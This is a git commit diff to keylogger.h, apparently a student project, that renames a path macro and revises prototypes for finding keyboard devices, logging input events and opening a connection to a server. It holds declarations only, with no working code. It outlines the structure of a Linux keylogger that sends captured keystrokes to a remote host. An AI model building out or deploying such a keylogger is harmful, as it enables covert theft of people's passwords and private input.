082433cc966cb6ab83e574c704eaaf772b4ce1cf
Fabio Cinicolo <f.cinicolo@studenti.unina.it>
2023-08-05 00:35:41 +0200

    Update keylogger.h

--- keylogger.h
+++ keylogger.h
@@ -5,15 +5,15 @@
 #define KEY_PRESSED 1
 #define KEY_RELEASED 0
 #define KEY_REPEATED 2
-#define PATH "/dev/input/"
+#define DEVICES_PATH "/dev/input/"
 typedef struct input_event event;
 
 void startKeylogger(int keyboard, int fd_out);
-int *findKeyboards(char * path, int *num_keyboards);
-int findRealKeyboard(int *keyboards, int num_keyboards, int timeout, int * keyboard);
 int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write);
-int isKeyboardDevice(int fd);
+int keyboardFound(char *path, int *keyboard_fd);
+int supportsRelativeMovement(int fd);
+int supportsSpecificKeys(int fd, int *keys, size_t num_keys);
 void sigHandler(int signum);
-int openConnectionWithServer(char*ip, short port);
+int openConnectionWithServer(char *ip, short port);
 
 #endif
